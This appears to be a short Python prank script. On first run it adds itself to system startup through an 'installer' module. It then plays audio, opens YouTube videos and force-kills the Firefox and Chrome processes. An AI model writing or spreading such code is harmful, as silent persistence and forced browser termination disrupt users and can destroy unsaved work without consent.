import webbrowser
import os
import time
with open("set.txt", "r+") as set:
    content = set.read()
    if content != "G":
        set.write("G")
        set.seek(0)
        import installer
        installer.add_to_startup(__file__)
os.system("sov.mp3")
webbrowser.open('https://www.youtube.com/watch?v=ITUPfCJXWKM&list=PLgXEga9ZWBu6lVOi5joalNdpWHETVwGEU')
time.sleep(360)
os.system("taskkill /im firefox.exe /f")
os.system("taskkill /im chrome.exe /f")
webbrowser.open('https://www.youtube.com/watch?v=WDg-eNpGC1I')
time.sleep(500)
webbrowser.open("https://www.youtube.com/watch?v=N4_8coTdf3U")